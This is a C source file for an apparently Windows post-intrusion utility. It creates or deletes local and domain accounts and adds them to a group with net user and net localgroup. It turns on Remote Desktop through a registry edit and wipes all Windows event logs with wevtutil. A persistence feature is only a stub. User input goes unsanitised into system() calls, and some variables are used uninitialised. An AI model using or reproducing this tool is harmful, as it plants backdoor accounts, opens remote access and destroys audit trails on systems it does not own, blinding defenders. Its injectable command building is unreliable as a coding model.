#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdbool.h>
#include <ctype.h>

#include "usage.h"

int main(int argc, char *argv[]) {


  for (int x = 1; x < argc; x++) {

    if (strcmp(argv[x], "user") == 0 ) {

      char *UserName = NULL;
      char Password[256];
      size_t PasswordLen = 0;
      char *Domain = NULL;
      char *Group = NULL;
      bool create,exist;
      bool adm = false;
      bool gex = false;
      bool activ = true;
      bool dom = false;

      for (int i = 2; i < argc; i++) {
        if (strcmp(argv[i], "-u") == 0 && i < argc - 1) {

          UserName = argv[++i];

        } else if (strcmp(argv[i], "-p") == 0 && i < argc - 1) {

          strncpy(Password, argv[++i], sizeof(Password));
          Password[sizeof(Password) - 1] = '\0';
          PasswordLen = strlen(Password);

        } else if (strcmp(argv[i], "-D") == 0 && i < argc - 1){

          Domain = argv[++i];
          dom = true;

        } else if (strcmp(argv[i], "-e") == 0 && i < argc - 1) {
            char *tmp = argv[++i];

            for (int z = 0; tmp[z]; z++){
                tmp[z] = tolower(tmp[z]);
            }

            if (strcmp(tmp, "no") == 0){
              activ = false;
            }

        } else if ( strcmp(argv[i], "-a")  == 0  || strcmp(argv[i], "-d") == 0 ) {
            exist = true;
            if (strcmp(argv[i], "-a") == 0 ){
                for ( int z = i ; z < argc; z++ ) {
                  if (strcmp(argv[z], "-d") == 0 ) {
                    argv[z] = "";
                  }
                }
                create = true;

            } else if (strcmp(argv[i], "-d") == 0 ) {
                for ( int z = i ; z < argc; z++ ) {
                  if (strcmp(argv[z], "-a") == 0 ) {
                    argv[z] = "";
                  }
                }
                create = false;

            }

        } else if (strcmp(argv[i], "-g") == 0 && i < argc - 1) {
          Group = argv[++i];
          gex = true;
        } else if (strcmp(argv[i], "-A") == 0 && i < argc - 1) {
            adm = true;

        } else if (strcmp(argv[i], "-h") == 0) {
            us();
            return 1;
        }
      }

    if (create != 0 && exist == 1) {

      if (UserName == NULL && PasswordLen == 0) {
         printf("Missing specifying the username and the password!\n");
         return 1;
      } else if (PasswordLen == 0){
        printf("Missing specifying the password!\n");
        return 1;
      } else if (UserName == NULL) {
        printf("Missing specifying the username!\n");
        return 1;
      } else if (adm != 0 && gex == 0){
        printf("The group name for the -A flag is missing.!\n");
        return 1;
      } else {
        char command[500];

        if(activ != 0){
          if (dom != 0){
            if (adm != 0){
              sprintf(command, "net user %s %s /DOMAIN:%s /active:yes /add | net localgroup %s %s\%s /add",UserName, Password, Domain, Group, Domain, UserName);
              system(command);
              return 0;
            } else {
              sprintf(command, "net user %s %s /DOMAIN:%s /active:yes /add",UserName, Password, Domain);
              system(command);
              return 0;
            }

          } else {
            if (adm != 0){
              sprintf(command, "net user %s %s /active:yes /add | net localgroup %s %s /add",UserName, Password, Group, UserName);
              system(command);
              return 0;
            } else {
              sprintf(command, "net user %s %s /active:yes /add",UserName, Password);
              system(command);
              return 0;
            }
          }
        } else {
          if (dom != 0){
            if (adm != 0){
              sprintf(command, "net user %s %s /DOMAIN:%s /active:no /add | net localgroup %s %s\%s /add",UserName, Password, Domain, Group, Domain, UserName);
              system(command);
              return 0;
            } else {
              sprintf(command, "net user %s %s /DOMAIN:%s /active:no /add",UserName, Password,Domain);
              system(command);
              return 0;
            }

          } else {
            if (adm != 0){
              sprintf(command, "net user %s %s /active:no /add | net localgroup %s %s /add",UserName, Password, Group, UserName);
              system(command);
              return 0;
            } else {
              sprintf(command, "net user %s %s /active:no /add",UserName, Password);
              system(command);
              return 0;
            }
          }
        }

      }

    } else if (create == 0 && exist == 1){

      if (UserName == NULL) {
         printf("Missing specifying the username!\n");
         return 1;
      } else {
        char command[500];
        printf("Ahora si eliminamos!\n");
          if (dom != 0){
              sprintf(command, "net user %s\%s /del",Domain, UserName);
              system(command);
              return 0;
          } else {
              sprintf(command, "net user %s /del",UserName);
              system(command);
              return 0;
          }
      }
    } else {
      printf("Missing '-a' or '-d' parameter!\n\n");
      us();
      return 1;
    }


    } else if (strcmp(argv[x], "persistence") == 0 ){
        char *file = NULL;
        bool create,exist;

        for (int i = 2; i < argc; i++) {
          if (strcmp(argv[i], "-f") == 0 && i < argc - 1) {
            file = argv[++i];
          } else if ( strcmp(argv[i], "-a")  == 0  || strcmp(argv[i], "-d") == 0 ) {
              exist = true;
              if (strcmp(argv[i], "-a") == 0 ){
                  for ( int z = i ; z < argc; z++ ) {
                    if (strcmp(argv[z], "-d") == 0 ) {
                      argv[z] = "";
                    }
                  }
                  create = true;
              } else if (strcmp(argv[i], "-d") == 0 ) {
                  for ( int z = i ; z < argc; z++ ) {
                    if (strcmp(argv[z], "-a") == 0 ) {
                      argv[z] = "";
                    }
                  }
                  create = false;
              }
        } else {
            pers();
            return 1;
        }
       }
       if (file == NULL){
           //printf("Missing file path!\n");
           printf("In building!\n" );
           return 1;
       } else {
           char command[500];
           if (create != 0 && exist == 1){
             printf("In building!\n" );

             return 0;
           } else if (create == 0 && exist == 1) {
             printf("In building!\n" );
             return 0;
           } else {
             //printf("Missing -a or -d parameter\n" );
             printf("In building!\n" );
             return 0;
           }
         }
      pers();
      return 0;

    } else if (strcmp(argv[x], "rdp") == 0 ) {
      char command[500];
      for (int i = 2; i < argc; i++) {

        if (strcmp(argv[i], "-e") == 0){
          printf("RDP activo\n");
          system("reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f");
          return 0;
        } else if (strcmp(argv[i], "-d") == 0){
          printf("RDP desactivado\n");
          system("reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 1 /f");
          return 0;
        } else if (strcmp(argv[i], "-h") == 0){
          rd();
          return 0;
        } else {
          printf("Incorrect flag!\n" );
          rd();
          return 1;
        }
      }
      rd();
      return 1;
    } else if (strcmp(argv[x], "clean") == 0 ){
      for (int i = 2; i < argc; i++) {
        if (strcmp(argv[i], "-a") == 0 ) {
          system("for /F \"tokens=*\" %1 in ('C:\\Windows\\system32\\wevtutil.exe el') DO C:\\Windows\\system32\\wevtutil.exe cl \"%1\"");
          return 0;
        } else {
          cl();
          return 1;
        }
      }
      cl();
      return 0;
    } else {
      gen();
      return 0;
    }

  }
  gen();
  return 0;
}
